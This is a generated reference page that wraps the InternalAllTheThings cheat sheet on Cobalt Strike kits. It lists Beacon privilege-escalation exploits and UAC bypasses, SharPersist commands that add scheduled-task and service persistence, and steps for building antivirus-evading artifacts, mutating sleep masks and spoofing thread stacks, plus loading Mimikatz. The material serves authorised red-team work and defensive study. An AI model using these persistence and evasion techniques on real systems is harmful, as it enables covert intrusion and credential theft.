---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Cobalt Strike - Kits

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-command-control-cobalt-strike-kits` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/cobalt-strike-kits.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cobalt Strike - Kits](../../topics/command-control/cobalt-strike-kits.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-command-control-cobalt-strike-kits |
| name | Cobalt Strike - Kits |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/command-control/cobalt-strike-kits.md |

## Preserved Source Material

````yaml
_body: "# Cobalt Strike - Kits\n\n* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community\
  \ Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike\n\n\
  ## Elevate Kit\n\nUAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)\n\n```powershell\nbeacon> runasadmin\n\
  \nBeacon Command Elevators\n========================\n\n    Exploit                         Description\n    -------   \
  \                      -----------\n    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)\n\
  \    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)\n    ms16-016              \
  \          mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)\n    svc-exe                         Get SYSTEM\
  \ via an executable run as a service\n    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)\n\
  \    uac-token-duplication           Bypass UAC with Token Duplication\n```\n\n## Persistence Kit\n\n* [0xthirteen/MoveKit](https://github.com/0xthirteen/MoveKit)\n\
  * [fireeye/SharPersist](https://github.com/fireeye/SharPersist)\n\n    ```powershell\n    # List persistences\n    SharPersist\
  \ -t schtaskbackdoor -m list\n    SharPersist -t startupfolder -m list\n    SharPersist -t schtask -m list\n\n    # Add\
  \ a persistence\n    SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something\
  \ Cool\" -m add\n    SharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove\n\n    SharPersist -t service -c \"\
  C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\n    SharPersist -t service -n \"Some Service\"\
  \ -m remove\n\n    SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\n\
  \    SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\n\
  \    SharPersist -t schtask -n \"Some Task\" -m remove\n    ```\n\n## Resource Kit\n\n> The Resource Kit is Cobalt Strike's\
  \ means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows\n\n## Artifact\
  \ Kit\n\n> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework\
  \ to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with\
  \ template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script\
  \ Manager, and load the artifact.cna script from that technique's folder.\n\n[Artifact Kit (Cobalt Strike 4.0)](https://www.youtube.com/watch?v=6mC21kviwG4)\n\
  \n* Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`\n\
  * Install the dependencies : `sudo apt-get install mingw-w64`\n* Edit the Artifact code\n    * Change pipename strings\n\
  \    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc\n    * Change Import\n* Build the Artifact\n* Cobalt\
  \ Strike -> Script Manager > Load .cna\n\n## Mimikatz Kit\n\n* Download and extract the .tgz from the Arsenal\n* Load the\
  \ mimikatz.cna aggressor script\n* Use mimikatz functions as normal\n\n## Sleep Mask Kit\n\n> The Sleep Mask Kit is the\
  \ source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.\n\nUse the\
  \ included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds\
  \ the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in\
  \ the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.\n\n## Mutator Kit\n\n> The Mutator Kit,\
  \ introduced by Cobalt Strike, is a tool designed to create uniquely mutated versions of a \"sleep mask\" used in payloads\
  \ to evade detection by static signatures. It utilizes LLVM obfuscation techniques to alter the sleep mask, making it difficult\
  \ for memory scanning tools to identify the mask based on predefined patterns, thereby enhancing operational security for\
  \ red team activities.\n\nThe OBFUSCATIONS variable can be `flattening`,`substitution`,`split-basic-blocks`,`bogus`.\n\n\
  ```ps1\nOBFUSCATIONS=substitution mutator.sh x64 -emit-llvm -S example.c -o example_with_substitutions.ll\nmutator.sh x64\
  \ -c -DIMPL_CHKSTK_MS=1 -DMASK_TEXT_SECTION=1 -o sleepmask.x64.o src49/sleepmask.c\n```\n\n## Thread Stack Spoofer\n\n>\
  \ An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory\
  \ examination rules and better hide shellcodes while in-process memory.\n\nThread Stack Spoofer is now enabled by default\
  \ in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.\n\
  \n## References\n\n* [Introducing the Mutator Kit: Creating Object File Monstrosities with Sleep Mask and LLVM - @joehowwolf\
  \ @HenriNurmi](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm)"
_relative_path: command-control/cobalt-strike-kits.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/cobalt-strike-kits.md
````
